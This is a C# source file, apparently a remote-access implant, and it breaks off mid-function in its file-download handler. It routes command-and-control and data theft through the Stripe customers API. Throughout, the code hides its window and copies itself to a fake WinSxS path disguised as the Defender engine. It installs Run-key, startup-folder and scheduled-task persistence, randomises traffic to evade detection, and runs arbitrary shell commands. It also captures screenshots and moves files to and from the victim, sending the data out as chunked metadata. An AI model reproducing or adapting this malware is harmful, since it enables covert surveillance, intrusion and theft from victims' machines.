using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

// ============================================
// HIDE CONSOLE (conditional compilation)
// ============================================
#if HIDE_CONSOLE
[DllImport("kernel32.dll")]
static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("kernel32.dll")]
static extern bool FreeConsole();
[DllImport("kernel32.dll")]
static extern bool AllocConsole();

static void HideConsoleWindow()
{
    // Method 1: FreeConsole — most reliable for single-file .NET on Windows 11
    // Completely detaches the process from its console window
    if (FreeConsole())
        return;

    // Method 2: ShowWindow fallback — for cases where FreeConsole fails
    // (e.g. process was explicitly attached to an existing console)
    var handle = GetConsoleWindow();
    if (handle != IntPtr.Zero)
        ShowWindow(handle, 0); // SW_HIDE = 0
}
#endif

// ============================================
// SELF-RELOCATION
// ============================================
// If running from a suspicious location (Downloads, Desktop, temp, etc.),
// copy self to a stealthy path and re-launch from there.
#if HIDE_CONSOLE
static bool RelocateSelf()
{
    try
    {
        var exePath = Process.GetCurrentProcess().MainModule?.FileName;
        if (string.IsNullOrEmpty(exePath)) return false;

        // Paths that indicate we were launched from a user-facing location
        string lower = exePath.ToLowerInvariant();
        bool inSuspiciousLocation =
            lower.Contains("\\downloads\\")  ||
            lower.Contains("\\desktop\\")    ||
            lower.Contains("\\documents\\")  ||
            lower.Contains("\\appdata\\local\\temp\\") ||
            lower.Contains("\\users\\public\\");

        if (!inSuspiciousLocation) return false;

        // Target: AppData\Roaming\Microsoft\Windows\WinSxS\  (looks like a legit MS path)
        string targetDir  = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            "Microsoft", "Windows", "WinSxS");
        Directory.CreateDirectory(targetDir);

        string targetPath = Path.Combine(targetDir, "MsMpEng.exe"); // mimics Defender engine name

        // Only copy if not already there or outdated
        if (!File.Exists(targetPath) ||
            new FileInfo(targetPath).Length != new FileInfo(exePath).Length)
        {
            File.Copy(exePath, targetPath, overwrite: true);
        }

        // Re-launch from the new location and exit this instance
        Process.Start(new ProcessStartInfo
        {
            FileName        = targetPath,
            UseShellExecute = false,
            CreateNoWindow  = true
        });

        return true; // caller should Environment.Exit(0)
    }
    catch { return false; }
}
#endif


#if PERSIST_REGISTRY || PERSIST_STARTUP || PERSIST_TASK
static void InstallPersistence()
{
    try
    {
        var exePath = System.Diagnostics.Process.GetCurrentProcess().MainModule?.FileName;
        if (string.IsNullOrEmpty(exePath)) return;

#if PERSIST_REGISTRY
        // Registry Run key
        try
        {
            using var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                @"Software\Microsoft\Windows\CurrentVersion\Run", true);
            if (key != null)
                key.SetValue("WindowsSecurityUpdate", exePath);
        }
        catch { }
#endif

#if PERSIST_STARTUP
        // Startup folder shortcut
        try
        {
            string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            string lnk = Path.Combine(startup, "MicrosoftEdgeUpdate.lnk");
            
            var psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-Command \"$s=New-Object -C WScript.Shell;$l=$s.CreateShortcut('{lnk}');$l.TargetPath='{exePath}';$l.Save()\"",
                UseShellExecute = false,
                CreateNoWindow = true
            };
            Process.Start(psi)?.WaitForExit(5000);
        }
        catch { }
#endif

#if PERSIST_TASK
        // Scheduled task
        try
        {
            var psi = new ProcessStartInfo
            {
                FileName = "schtasks.exe",
                Arguments = $"/Create /TN \"EdgeUpdateTask\" /TR \"{exePath}\" /SC DAILY /ST 09:00 /F",
                UseShellExecute = false,
                CreateNoWindow = true
            };
            Process.Start(psi)?.WaitForExit(5000);
        }
        catch { }
#endif
    }
    catch { }
}
#endif

// ============================================
// CONFIGURATION - STEALTH PROFILES
// ============================================
// Compile-time defaults based on stealth profile (can be overridden at runtime if ALLOW_DYNAMIC_CONFIG is set)

#if STEALTH_LOW
const int    DEFAULT_POLL_MIN_MS = 2000;      // 2-5 seconds (fast response)
const int    DEFAULT_POLL_MAX_MS = 5000;
const int    DEFAULT_HEARTBEAT_MIN_S = 15;    // 15-30 seconds
const int    DEFAULT_HEARTBEAT_MAX_S = 30;
#elif STEALTH_HIGH
const int    DEFAULT_POLL_MIN_MS = 30000;     // 30-60 seconds (high stealth)
const int    DEFAULT_POLL_MAX_MS = 60000;
const int    DEFAULT_HEARTBEAT_MIN_S = 120;   // 2-3 minutes
const int    DEFAULT_HEARTBEAT_MAX_S = 180;
#elif STEALTH_PARANOID
const int    DEFAULT_POLL_MIN_MS = 120000;    // 2-5 minutes (maximum stealth)
const int    DEFAULT_POLL_MAX_MS = 300000;
const int    DEFAULT_HEARTBEAT_MIN_S = 600;   // 10-15 minutes
const int    DEFAULT_HEARTBEAT_MAX_S = 900;
#else // STEALTH_BALANCED (default)
const int    DEFAULT_POLL_MIN_MS = 5000;      // 5-15 seconds (balanced)
const int    DEFAULT_POLL_MAX_MS = 15000;
const int    DEFAULT_HEARTBEAT_MIN_S = 25;    // 25-35 seconds
const int    DEFAULT_HEARTBEAT_MAX_S = 35;
#endif

// Runtime-modifiable configuration (if ALLOW_DYNAMIC_CONFIG is enabled)
int    POLL_MIN_MS = DEFAULT_POLL_MIN_MS;
int    POLL_MAX_MS = DEFAULT_POLL_MAX_MS;
int    HEARTBEAT_MIN_S = DEFAULT_HEARTBEAT_MIN_S;
int    HEARTBEAT_MAX_S = DEFAULT_HEARTBEAT_MAX_S;

const int    CHUNK_SIZE  = 490;
const int    DATA_FIELDS = 44;

// ============================================
// STRIPE HELPERS
// ============================================

// Cryptographically secure random number generator for jitter
var _rng = RandomNumberGenerator.Create();

int GetJitteredDelay(int minMs, int maxMs)
{
    var buffer = new byte[4];
    _rng.GetBytes(buffer);
    int randomValue = BitConverter.ToInt32(buffer, 0) & 0x7FFFFFFF; // Ensure positive
    return minMs + (randomValue % (maxMs - minMs + 1));
}

string GetRandomUserAgent()
{
    // Common legitimate User-Agents that match the operating system
    var userAgents = new[]
    {
        // Windows User-Agents
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
        
        // Linux User-Agents
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
        
        // macOS User-Agents
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.2; rv:122.0) Gecko/20100101 Firefox/122.0"
    };
    
    // Pick a random User-Agent
    var buffer = new byte[4];
    _rng.GetBytes(buffer);
    int index = (BitConverter.ToInt32(buffer, 0) & 0x7FFFFFFF) % userAgents.Length;
    return userAgents[index];
}

HttpClient BuildClient()
{
    var client = new HttpClient { BaseAddress = new Uri("https://api.stripe.com") };
    client.DefaultRequestHeaders.Authorization =
        new AuthenticationHeaderValue("Bearer", EncryptedStrings.API_KEY);
    
    // Set random User-Agent to blend with normal browser traffic
    client.DefaultRequestHeaders.UserAgent.ParseAdd(GetRandomUserAgent());
    
    return client;
}

Dictionary<string, string> GetMeta(JsonElement customer)
{
    var result = new Dictionary<string, string>();
    if (customer.TryGetProperty("metadata", out var meta))
        foreach (var prop in meta.EnumerateObject())
            result[prop.Name] = prop.Value.GetString() ?? "";
    return result;
}

string GetId(JsonElement customer)
    => customer.GetProperty("id").GetString()!;

// ── Stripe API calls ──────────────────────────────────────────────────────────

async Task<T> WithRetry<T>(Func<Task<T>> fn, int maxAttempts = 8)
{
    for (int attempt = 0; attempt < maxAttempts; attempt++)
    {
        try { return await fn(); }
        catch (HttpRequestException) { if (attempt == maxAttempts - 1) throw; }
        await Task.Delay((int)Math.Pow(2, attempt) * 1000);
    }
    return await fn();
}

// Rate-limit-aware HTTP POST that retries on 429
async Task<string> PostWithRetry(HttpClient http, string url, Dictionary<string, string> fields)
{
    for (int attempt = 0; attempt < 8; attempt++)
    {
        using var resp = await http.PostAsync(url, new FormUrlEncodedContent(fields));
        if ((int)resp.StatusCode == 429)
        {
            int wait = (int)Math.Pow(2, attempt) * 1000;
            Console.WriteLine($"    [!] Rate limited, waiting {wait/1000}s...");
            await Task.Delay(wait);
            continue;
        }
        resp.EnsureSuccessStatusCode();
        return await resp.Content.ReadAsStringAsync();
    }
    throw new Exception("Max retries exceeded");
}

async Task<string> CreateAsync(HttpClient http, Dictionary<string, string> fields)
{
    string body = await PostWithRetry(http, "/v1/customers", fields);
    return JsonDocument.Parse(body).RootElement.GetProperty("id").GetString()!;
}

async Task UpdateAsync(HttpClient http, string id, Dictionary<string, string> fields)
{
    await PostWithRetry(http, $"/v1/customers/{id}", fields);
}

#if ALLOW_DYNAMIC_CONFIG
// ── Dynamic Configuration Handler ─────────────────────────────────────────────────
void ApplyDynamicConfig(Dictionary<string, string> meta)
{
    // Operator can send config updates via special metadata fields
    // Format: config_poll_min, config_poll_max, config_heartbeat_min, config_heartbeat_max
    
    if (meta.TryGetValue("config_poll_min", out var pollMin) && int.TryParse(pollMin, out int pMin))
    {
        POLL_MIN_MS = Math.Max(1000, pMin); // Minimum 1 second
        Console.WriteLine($"[*] Config update: POLL_MIN_MS = {POLL_MIN_MS}ms");
    }
    
    if (meta.TryGetValue("config_poll_max", out var pollMax) && int.TryParse(pollMax, out int pMax))
    {
        POLL_MAX_MS = Math.Max(POLL_MIN_MS, pMax); // Must be >= min
        Console.WriteLine($"[*] Config update: POLL_MAX_MS = {POLL_MAX_MS}ms");
    }
    
    if (meta.TryGetValue("config_heartbeat_min", out var hbMin) && int.TryParse(hbMin, out int hMin))
    {
        HEARTBEAT_MIN_S = Math.Max(10, hMin); // Minimum 10 seconds
        Console.WriteLine($"[*] Config update: HEARTBEAT_MIN_S = {HEARTBEAT_MIN_S}s");
    }
    
    if (meta.TryGetValue("config_heartbeat_max", out var hbMax) && int.TryParse(hbMax, out int hMax))
    {
        HEARTBEAT_MAX_S = Math.Max(HEARTBEAT_MIN_S, hMax); // Must be >= min
        Console.WriteLine($"[*] Config update: HEARTBEAT_MAX_S = {HEARTBEAT_MAX_S}s");
    }
}
#endif

async Task<JsonElement> FetchAsync(HttpClient http, string id)
{
    for (int attempt = 0; attempt < 8; attempt++)
    {
        using var resp = await http.GetAsync($"/v1/customers/{id}");
        if ((int)resp.StatusCode == 429)
        {
            int wait = (int)Math.Pow(2, attempt) * 1000;
            await Task.Delay(wait);
            continue;
        }
        return JsonDocument.Parse(await resp.Content.ReadAsStringAsync()).RootElement;
    }
    throw new Exception("Max retries exceeded");
}

async Task<List<JsonElement>> SearchAsync(HttpClient http, string implantId)
{
    // Search for objects belonging to this implant by name — avoids scanning all objects
    string encoded = Uri.EscapeDataString(implantId);
    using var resp = await http.GetAsync($"/v1/customers/search?query=name%3A%22{encoded}%22&limit=100");
    var doc  = JsonDocument.Parse(await resp.Content.ReadAsStringAsync()).RootElement;
    var list = new List<JsonElement>();
    if (doc.TryGetProperty("data", out var data))
        foreach (var el in data.EnumerateArray())
            list.Add(el);
    return list;
}

async Task<List<JsonElement>> ListAllAsync(HttpClient http)
{
    var    all = new List<JsonElement>();
    string url = "/v1/customers?limit=100";

    while (true)
    {
        using var resp = await http.GetAsync(url);
        var       doc  = JsonDocument.Parse(await resp.Content.ReadAsStringAsync()).RootElement;

        foreach (var el in doc.GetProperty("data").EnumerateArray())
            all.Add(el);

        bool hasMore = doc.TryGetProperty("has_more", out var hm) && hm.GetBoolean();
        if (!hasMore || all.Count == 0) break;

        url = $"/v1/customers?limit=100&starting_after={all[^1].GetProperty("id").GetString()}";
    }

    return all;
}

// ============================================
// PROGRESS BAR
// ============================================
void PrintProgress(int done, int total, int width = 40)
{
    double pct    = total > 0 ? (double)done / total : 1.0;
    int    filled = (int)(width * pct);
    string bar    = new string('█', filled) + new string('░', width - filled);
    Console.Write($"\r    [{bar}] {done}/{total} ({pct * 100:F1}%)");
}

// ============================================
// HEARTBEAT
// ============================================
async Task RegisterAsync(HttpClient http, string implantId, string? existingId)
{
    var fields = new Dictionary<string, string>
    {
        ["metadata[type]"]      = EncryptedStrings.S_HEARTBEAT,
        ["metadata[implant]"]   = implantId,
        ["metadata[os]"]        = Environment.OSVersion.Platform.ToString(),
        ["metadata[hostname]"]  = Environment.MachineName,
        ["metadata[last_seen]"] = DateTimeOffset.UtcNow.ToUnixTimeSeconds().ToString()
    };

    try
    {
        if (existingId != null)
            await UpdateAsync(http, existingId, fields);
        else
        {
            fields["name"] = $"{EncryptedStrings.S_HEARTBEAT}-{implantId}";
            await CreateAsync(http, fields);
        }
        Console.WriteLine("[*] Heartbeat sent");
    }
    catch (Exception ex)
    {
        Console.WriteLine($"[-] Heartbeat failed: {ex.Message}");
    }
}

// ============================================
// COMMAND EXECUTION
// ============================================

// ── Screen Capture (Windows only) ─────────────────────────────────────────────
#if PERSIST_REGISTRY || PERSIST_STARTUP || PERSIST_TASK || HIDE_CONSOLE
// These are Windows-only flags, so we know we're on Windows

[DllImport("user32.dll")]
static extern IntPtr GetDesktopWindow();
[DllImport("user32.dll")]
static extern IntPtr GetDC(IntPtr hWnd);
[DllImport("user32.dll")]
static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
[DllImport("user32.dll")]
static extern int GetSystemMetrics(int nIndex);
[DllImport("gdi32.dll")]
static extern IntPtr CreateCompatibleDC(IntPtr hdc);
[DllImport("gdi32.dll")]
static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
[DllImport("gdi32.dll")]
static extern IntPtr SelectObject(IntPtr hdc, IntPtr h);
[DllImport("gdi32.dll")]
static extern bool BitBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest,
                          IntPtr hdcSource, int xSrc, int ySrc, int rop);
[DllImport("gdi32.dll")]
static extern bool DeleteObject(IntPtr hObject);
[DllImport("gdi32.dll")]
static extern bool DeleteDC(IntPtr hdc);

// GDI+ / screenshot DllImports
[DllImport("gdiplus.dll")] static extern int  GdiplusStartup(out IntPtr token, ref GdiplusStartupInput input, IntPtr output);
[DllImport("gdiplus.dll")] static extern void GdiplusShutdown(IntPtr token);
[DllImport("gdiplus.dll")] static extern int  GdipCreateBitmapFromScan0(int w, int h, int stride, int fmt, byte[] scan0, out IntPtr bmp);
[DllImport("gdiplus.dll")] static extern int  GdipSaveImageToFile(IntPtr image, [MarshalAs(UnmanagedType.LPWStr)] string filename, ref Guid clsidEncoder, IntPtr encoderParams);
[DllImport("gdiplus.dll")] static extern int  GdipDisposeImage(IntPtr image);
[DllImport("gdi32.dll")]   static extern int  GetDIBits(IntPtr hdc, IntPtr hbmp, uint start, uint lines, byte[] lpvBits, ref BITMAPINFO lpbmi, uint usage);
[DllImport("user32.dll")]  static extern bool SetProcessDPIAware();
[DllImport("gdi32.dll")]   static extern int GetDeviceCaps(IntPtr hdc, int nIndex);

byte[] CaptureScreen(int jpegQuality = 40)
{
    IntPtr gdipToken = IntPtr.Zero;
    IntPtr gdipBmp   = IntPtr.Zero;
    string tmpFile   = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName() + ".jpg");
    try
    {
        // ── 1. GDI screen capture ─────────────────────────────────────────────
        SetProcessDPIAware(); // FIX: must be called before any metrics

        IntPtr desktopDC = GetDC(GetDesktopWindow());

        // FIX: Use GetDeviceCaps for physical pixel dimensions
        // GetSystemMetrics returns logical (DPI-scaled) values which are wrong
        // DESKTOPHORZRES=118, DESKTOPVERTRES=117 return true physical pixels
        int vw = GetDeviceCaps(desktopDC, 118);
        int vh = GetDeviceCaps(desktopDC, 117);

        // Fallback if GetDeviceCaps returns 0
        if (vw <= 0 || vh <= 0)
        {
            vw = GetSystemMetrics(0);
            vh = GetSystemMetrics(1);
        }

        IntPtr memDC = CreateCompatibleDC(desktopDC);
        IntPtr hBmp  = CreateCompatibleBitmap(desktopDC, vw, vh);
        IntPtr old   = SelectObject(memDC, hBmp);
        // No vx/vy offset needed — physical coords always start at 0,0
        BitBlt(memDC, 0, 0, vw, vh, desktopDC, 0, 0, 0x00CC0020); // SRCCOPY

        // ── 2. Extract raw BGR pixels via GetDIBits ───────────────────────────
        int stride = ((vw * 3 + 3) & ~3);
        var bi = new BITMAPINFO();
        bi.bmiHeader.biSize     = (uint)Marshal.SizeOf<BITMAPINFOHEADER>();
        bi.bmiHeader.biWidth    = vw;
        bi.bmiHeader.biHeight   = -vh;
        bi.bmiHeader.biPlanes   = 1;
        bi.bmiHeader.biBitCount = 24;
        byte[] pixels = new byte[stride * vh];
        // FIX: use desktopDC not memDC
        GetDIBits(desktopDC, hBmp, 0, (uint)vh, pixels, ref bi, 0);

        SelectObject(memDC, old);
        DeleteObject(hBmp);
        DeleteDC(memDC);
        ReleaseDC(IntPtr.Zero, desktopDC);

        // ── 3. GDI+ startup ───────────────────────────────────────────────────
        var si = new GdiplusStartupInput { GdiplusVersion = 1 };
        int hr = GdiplusStartup(out gdipToken, ref si, IntPtr.Zero);
        if (hr != 0) return Encoding.UTF8.GetBytes($"[-] Screenshot failed: GdiplusStartup 0x{hr:X}\n");

        int gdiFmt = 0x00021808;
        hr = GdipCreateBitmapFromScan0(vw, vh, stride, gdiFmt, pixels, out gdipBmp);
        if (hr != 0) return Encoding.UTF8.GetBytes($"[-] Screenshot failed: GdipCreateBitmap 0x{hr:X}\n");

        // ── 4. Save to temp file as JPEG ──────────────────────────────────────
        var jpegClsid   = new Guid("557CF401-1A04-11D3-9A73-0000F81EF32E");
        var qualityGuid = new Guid("1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB");
        var qualityVal  = Marshal.AllocCoTaskMem(sizeof(long));
        Marshal.WriteInt64(qualityVal, jpegQuality);
        var ep    = new EncoderParameters { Count = 1, Parameter = new EncoderParameter { Guid = qualityGuid, NumberOfValues = 1, Type = 4, Value = qualityVal } };
        var epPtr = Marshal.AllocCoTaskMem(Marshal.SizeOf<EncoderParameters>());
        Marshal.StructureToPtr(ep, epPtr, false);
        hr = GdipSaveImageToFile(gdipBmp, tmpFile, ref jpegClsid, epPtr);
        Marshal.FreeCoTaskMem(qualityVal);
        Marshal.FreeCoTaskMem(epPtr);
        if (hr != 0) return Encoding.UTF8.GetBytes($"[-] Screenshot failed: GdipSave 0x{hr:X}\n");

        // ── 5. Read JPEG bytes and delete temp file ───────────────────────────
        byte[] jpg = File.ReadAllBytes(tmpFile);
        return jpg;
    }
    catch (Exception ex)
    {
        return Encoding.UTF8.GetBytes($"[-] Screenshot failed: {ex.GetType().Name}: {ex.Message}\n");
    }
    finally
    {
        if (gdipBmp   != IntPtr.Zero) GdipDisposeImage(gdipBmp);
        if (gdipToken != IntPtr.Zero) GdiplusShutdown(gdipToken);
        try { if (File.Exists(tmpFile)) File.Delete(tmpFile); } catch { }
    }
}
#endif

byte[] ExecuteCommand(string cmd, ref string cwd, ref bool isBinary)
{
    isBinary = false;
    string stripped = cmd.Trim();

    // Screenshot command (Windows only)
    #if PERSIST_REGISTRY || PERSIST_STARTUP || PERSIST_TASK || HIDE_CONSOLE
    if (stripped.Equals("screenshot", StringComparison.OrdinalIgnoreCase))
    {
        Console.WriteLine("[*] Capturing screenshot...");
        byte[] imgData = CaptureScreen();
        Console.WriteLine($"[+] Screenshot: {imgData.Length} bytes, valid={imgData.Length > 1 && imgData[0] == 0xFF && imgData[1] == 0xD8}");
        isBinary = imgData.Length > 1 && imgData[0] == 0xFF && imgData[1] == 0xD8;
        return imgData;
    }
    #endif

    if (stripped.StartsWith("cd", StringComparison.OrdinalIgnoreCase) &&
        (stripped.Length == 2 || stripped[2] == ' '))
    {
        string[] parts = stripped.Split(' ', 2, StringSplitOptions.RemoveEmptyEntries);
        string   target = parts.Length == 1
            ? Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
            : Path.GetFullPath(Path.Combine(cwd, parts[1].Trim()));

        if (Directory.Exists(target)) { cwd = target; return Encoding.UTF8.GetBytes($"[+] Changed directory to: {cwd}\n"); }
        return Encoding.UTF8.GetBytes($"[-] Directory not found: {target}\n");
    }

    try
    {
        using var proc = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName               = "cmd.exe",
                Arguments              = $"/c chcp 65001 > nul & {stripped}",
                WorkingDirectory       = cwd,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                UseShellExecute        = false,
                CreateNoWindow         = true,
                StandardOutputEncoding = Encoding.UTF8,
                StandardErrorEncoding  = Encoding.UTF8
            }
        };

        var sb = new StringBuilder();
        proc.OutputDataReceived += (_, e) => { if (e.Data != null) sb.AppendLine(e.Data); };
        proc.ErrorDataReceived  += (_, e) => { if (e.Data != null) sb.AppendLine(e.Data); };
        proc.Start();
        proc.BeginOutputReadLine();
        proc.BeginErrorReadLine();

        if (!proc.WaitForExit(30_000)) { proc.Kill(); return Encoding.UTF8.GetBytes("[!] Command timed out\n"); }

        return Encoding.UTF8.GetBytes(sb.ToString());
    }
    catch (Exception ex) { return Encoding.UTF8.GetBytes($"[-] Error: {ex.Message}\n"); }
}

async Task WriteResultAsync(HttpClient http, string customerId,
                                   string cmdB64, byte[] output, string cwd, string implantId, bool isBinary = false)
{
    string b64 = Convert.ToBase64String(output);
    int    n   = (int)Math.Ceiling((double)b64.Length / CHUNK_SIZE);

    // If result fits in one Stripe object (≤ DATA_FIELDS chunks), write inline
    if (n <= DATA_FIELDS)
    {
        var fields = new Dictionary<string, string>
        {
            ["metadata[tag]"]     = EncryptedStrings.S_C2_DONE,
            ["metadata[implant]"] = implantId,
            ["metadata[cmd]"]     = cmdB64,
            ["metadata[cwd]"]     = cwd.Length > CHUNK_SIZE ? cwd[..CHUNK_SIZE] : cwd,
            ["metadata[chunks]"]  = n.ToString(),
            ["metadata[binary]"]  = isBinary ? "1" : "0"
        };
        for (int i = 0, idx = 0; i < b64.Length; i += CHUNK_SIZE, idx++)
            fields[$"metadata[r{idx}]"] = b64.Substring(i, Math.Min(CHUNK_SIZE, b64.Length - i));
        await UpdateAsync(http, customerId, fields);
        return;
    }

    // Large result — chunk across multiple Stripe objects (same path as file download)
    Console.WriteLine($"[*] Large result ({output.Length} bytes), using chunked transfer...");

    int    totalSegs  = n;
    int    totalObjs  = (int)Math.Ceiling((double)totalSegs / DATA_FIELDS);
    var    sem        = new SemaphoreSlim(6);
    var    objIds     = new string[totalObjs];
    int    created    = 0;

    await Task.WhenAll(Enumerable.Range(0, totalObjs).Select(async objIdx =>
    {
        await sem.WaitAsync();
        try
        {
            var f = new Dictionary<string, string>
            {
                ["name"]              = $"{EncryptedStrings.S_C2_DONE}-data-{objIdx}",
                ["metadata[tag]"]     = EncryptedStrings.S_C2_DONE,
                ["metadata[implant]"] = implantId,
                ["metadata[seq]"]     = objIdx.ToString()
            };
            int startSeg = objIdx * DATA_FIELDS;
            int count    = Math.Min(DATA_FIELDS, totalSegs - startSeg);
            for (int s = 0; s < count; s++)
            {
                int charStart = (startSeg + s) * CHUNK_SIZE;
                int charLen   = Math.Min(CHUNK_SIZE, b64.Length - charStart);
                f[$"metadata[r{s}]"] = b64.Substring(charStart, charLen);
            }
            f["metadata[local_chunks]"] = count.ToString();
            objIds[objIdx] = await CreateAsync(http, f);
            PrintProgress(Interlocked.Increment(ref created), totalObjs);
        }
        finally { sem.Release(); }
    }));

    Console.WriteLine();

    // Update the task object to signal done with index of data objects
    string allIds = string.Join(",", objIds);
    await UpdateAsync(http, customerId, new()
    {
        ["metadata[tag]"]          = EncryptedStrings.S_C2_DONE,
        ["metadata[implant]"]      = implantId,
        ["metadata[cmd]"]          = cmdB64,
        ["metadata[cwd]"]          = cwd.Length > CHUNK_SIZE ? cwd[..CHUNK_SIZE] : cwd,
        ["metadata[chunks]"]       = "0",
        ["metadata[large]"]        = "1",
        ["metadata[binary]"]       = isBinary ? "1" : "0",
        ["metadata[total_objects]"]= totalObjs.ToString(),
        ["metadata[obj_ids]"]      = allIds.Length <= CHUNK_SIZE ? allIds : "",
        ["metadata[total_segs]"]   = totalSegs.ToString()
    });
}

// ============================================
// UPLOAD  (operator → implant)
// ============================================
async Task HandleUploadAsync(HttpClient http, string ctrlId,
                                    Dictionary<string, string> ctrlMeta, string implantId)
{
    string xferId       = ctrlMeta["xfer_id"];
    string remotePath   = ctrlMeta["remote_path"];
    int    totalObjects = int.Parse(ctrlMeta["total_objects"]);
    int    totalIdx     = int.Parse(ctrlMeta.GetValueOrDefault("total_idx", "0"));

    if (remotePath.EndsWith("\\") || remotePath.EndsWith("/") || Directory.Exists(remotePath))
        remotePath = Path.Combine(remotePath, ctrlMeta.GetValueOrDefault("filename", "upload"));

    Console.WriteLine($"[*] Upload request: {remotePath}  ({totalObjects} segment(s))");

    try
    {
        await UpdateAsync(http, ctrlId, new() { ["metadata[tag]"] = EncryptedStrings.S_XFER_UPLOAD_PROCESSING });

        // ── Step 1: walk ctrl chain to collect all segment IDs ───────────────────
        // Each ctrl holds up to 1100 IDs (25/field * 44 fields), chained via "next"
        var segmentIds = new List<string>();
        string? nextId = ctrlId;

        while (!string.IsNullOrEmpty(nextId))
        {
            var    ctrlDoc  = nextId == ctrlId ? ctrlMeta : GetMeta(await FetchAsync(http, nextId));
            int    idCount  = int.Parse(ctrlDoc.GetValueOrDefault("id_count", "0"));

            // Extract packed IDs from s0, s1, s2... fields
            for (int f = 0; ; f++)
            {
                if (!ctrlDoc.TryGetValue($"s{f}", out string? packed) || string.IsNullOrEmpty(packed)) break;
                segmentIds.AddRange(packed.Split(','));
            }

            nextId = ctrlDoc.GetValueOrDefault("next");
            if (nextId == "") nextId = null;
        }

        Console.WriteLine($"    {segmentIds.Count} segment IDs resolved from ctrl chain");

        if (segmentIds.Count != totalObjects)
        {
            string e = $"[-] Upload failed: expected {totalObjects} IDs, got {segmentIds.Count}";
            Console.WriteLine(e);
            await UpdateAsync(http, ctrlId, new()
            {
                ["metadata[tag]"]        = EncryptedStrings.S_C2_DONE,
                ["metadata[result_b64]"] = Convert.ToBase64String(Encoding.UTF8.GetBytes(e))
            });
            return;
        }

        // ── Step 2: fetch all segments in parallel by ID ──────────────────────
        Console.WriteLine($"    fetching {totalObjects} segment(s) in parallel...");
        PrintProgress(0, totalObjects);

        var    segmentMetas = new Dictionary<string, string>[totalObjects];
        int    fetchedCount = 0;
        var    sem          = new SemaphoreSlim(6);  // stay well under Stripe's 100 req/s limit

        await Task.WhenAll(segmentIds.Select(async (sid, seq) =>
        {
            await sem.WaitAsync();
            try
            {
                segmentMetas[seq] = GetMeta(await FetchAsync(http, sid));
                PrintProgress(Interlocked.Increment(ref fetchedCount), totalObjects);
            }
            finally { sem.Release(); }
        }));

        Console.WriteLine();

        // ── Step 3: reassemble and write ──────────────────────────────────────
        var allChunks = new List<string>();
        for (int seq = 0; seq < totalObjects; seq++)
        {
            var dm = segmentMetas[seq];
            int n  = int.Parse(dm.GetValueOrDefault("local_chunks", "0"));
            for (int i = 0; i < n; i++) allChunks.Add(dm.GetValueOrDefault($"r{i}", ""));
        }

        byte[] fileBytes = Convert.FromBase64String(string.Concat(allChunks));
        string? dir = Path.GetDirectoryName(remotePath);
        if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir)) Directory.CreateDirectory(dir);

        await File.WriteAllBytesAsync(remotePath, fileBytes);
        string ok = $"[+] Written {fileBytes.Length:N0} bytes → {remotePath}";
        Console.WriteLine(ok);

        await UpdateAsync(http, ctrlId, new()
        {
            ["metadata[tag]"]        = EncryptedStrings.S_C2_DONE,
            ["metadata[result_b64]"] = Convert.ToBase64String(Encoding.UTF8.GetBytes(ok))
        });
    }
    catch (Exception ex)
    {
        string e = $"[-] Upload exception: {ex.Message}";
        Console.WriteLine(e);
        try { await UpdateAsync(http, ctrlId, new()
        {
            ["metadata[tag]"]        = EncryptedStrings.S_C2_DONE,
            ["metadata[result_b64]"] = Convert.ToBase64String(Encoding.UTF8.GetBytes(e))
        }); } catch { }
    }
}

// ============================================
// DOWNLOAD  (implant → operator)
// ============================================
async Task HandleDownloadAsync(HttpClient http, string reqId,
                                      Dictionary<string, string> reqMeta, string implantId)
{
    string xferId     = reqMeta["xfer_id"];
    string remotePath = reqMeta["remote_path"];

    Console.WriteLine($"[*] Download request: {remotePath}");
    await UpdateAsync(http, reqId, new() { ["metadata[tag]"] = EncryptedStrings.S_XFER_DOWNLOAD_PROCESSING });

    try
    {
        if (!File.Exists(remotePath))
        {
            await UpdateAsync(http, reqId, new()
            {
                ["metadata[tag]"]   = EncryptedStrings.S_XFER_DOWNLOAD_ERROR,
                ["metadata[error]"] = $"File not found: {remotePath}"
            });
            Console.WriteLine($"[-] File not found: {remotePath}");
            return;
        }

        byte[] fileBytes    = await File.ReadAllBytesAsync(remotePath);
        string b64          = Convert.ToBase64String(fileBytes);
        var    chunks       = new List<string>();
        for (int i = 0; i < b64.Length; i += CHUNK_SIZE)
